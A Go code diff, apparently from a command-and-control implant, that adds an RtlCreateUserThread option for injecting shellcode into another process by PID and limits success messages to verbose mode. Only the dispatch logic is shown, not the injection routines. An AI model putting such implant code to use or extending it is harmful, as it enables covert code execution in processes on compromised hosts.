@@ -782,10 +782,8 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 			if a.Verbose {
 				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
 				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			} else {
-				message("success", "Shellcode was successfully executed")
 			}
-		}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
 		return err
 	} else if shellcode.Method == "remote" {
 		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
@@ -793,12 +791,19 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 			if a.Verbose {
 				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
 				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			} else {
-				message("success", "Shellcode was successfully executed")
 			}
-		}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
 		return err
-	} else {
+	} else if shellcode.Method == "rtlcreateuserthread" {
+		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
+	}else {
 		if a.Verbose{
 			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
 		}
